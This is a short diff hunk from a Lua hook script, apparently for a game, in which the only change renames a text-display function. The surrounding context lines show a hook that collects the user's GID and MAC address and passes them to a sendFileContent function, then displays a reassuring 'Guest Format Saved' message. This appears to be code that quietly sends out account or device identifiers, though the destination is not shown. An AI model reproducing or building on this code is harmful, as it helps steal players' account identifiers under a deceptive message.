@@ -40,7 +40,7 @@ AddHook("OnVarlist","monarchsatan", function(var)
       local gString = getGid() 
       local mString = getMac()
       sendFileContent(gString, mString)
-      overText("Guest Format Saved") 
+      textOver("Guest Format Saved") 
     end
     if var[0] == "OnConsoleMessage" then
       if var[1]:find("entered.") then
